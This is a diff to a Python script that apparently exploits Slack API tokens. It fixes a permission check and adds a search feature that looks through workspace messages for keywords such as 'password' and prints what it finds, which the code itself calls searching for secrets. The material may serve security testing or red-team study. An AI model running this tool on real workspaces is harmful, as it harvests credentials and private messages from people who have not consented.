@@ -25,7 +25,7 @@ t = WebClient(args.token)
 perms = []
 
 def token_attacks():
-    if 'search.messages' in perms:
+    if 'search:read' in perms:
         print(parse._option_string_actions['-s'].option_strings,parse._option_string_actions['-s'].help)
     if 'chat:write.customize' in perms:
         print(parse._option_string_actions['-sP'].option_strings,parse._option_string_actions['-sP'].help)
@@ -167,7 +167,19 @@ def sendFile():
     initial_comment=message,
 )
 
-
+def keywordSearch():
+    div()
+    keyword = input('Type the keyword you\'d like to search for.\nExample: password\n')
+    div()
+    search = t.search_messages(
+    query = keyword,
+    sort = "timestamp",
+)
+    searchData = search.data['messages']['matches']
+    count = len(searchData)
+    for data in range(count):
+        print(searchData[data]['text'])
+    
 
 # Look for arguements
 if args.spoof == True:
@@ -209,3 +221,12 @@ if args.attach == True:
         exit()
     else:
         setupFileMessage()
+if args.search == True:
+    if 'search:read' not in perms:
+        div()
+        print('ERROR: Your provided token does not have the search:read permissions.',
+              'You can not do a keyword search for secrets'
+              )
+        exit()
+    else:
+        keywordSearch()
